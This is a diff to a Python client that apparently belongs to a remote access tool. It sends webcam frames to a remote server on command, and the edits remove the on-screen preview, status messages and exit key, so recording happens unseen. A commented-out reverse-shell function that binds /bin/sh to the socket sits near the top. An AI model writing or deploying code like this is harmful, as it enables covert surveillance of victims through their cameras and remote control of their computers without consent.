@@ -8,6 +8,9 @@ import pickle
 import struct
 import imutils
 
+# Supposed to be a stable bash shell, works
+# on the client but not on the server
+
 # def spawn_shell(s):
 	
 # 	os.dup2(s.fileno(), 0) 
@@ -15,24 +18,20 @@ import imutils
 # 	os.dup2(s.fileno(), 2) 
 # 	run(["/bin/sh","-i"])
 
+
+# Capture video with webcam
+
 class VideoStream:
 	def __init__(self, s):
 		self.s = s
 
 	def send(self):
-		print("Starting recording...")
 		vid = cv2.VideoCapture(0)
-		print("Sending to server")
 		while(vid.isOpened()):
 			img,frame = vid.read()
 			a = pickle.dumps(frame)
 			message = struct.pack("Q", len(a)) + a
 			self.s.sendall(message)
-			print("Showing screen")
-			cv2.imshow('Sender', frame)
-			key = cv2.waitKey(10)
-			if key == 13:
-				return
 
 
 def main(SERVER_HOST, SERVER_PORT):
@@ -54,7 +53,7 @@ def main(SERVER_HOST, SERVER_PORT):
 				output = str(e)
 			else:
 				output = ""
-		elif splitted_command[0] == "record":
+		elif splitted_command[0] == "webcam":
 			stream = VideoStream(s)
 			stream.send()
 		#elif command == "shell":
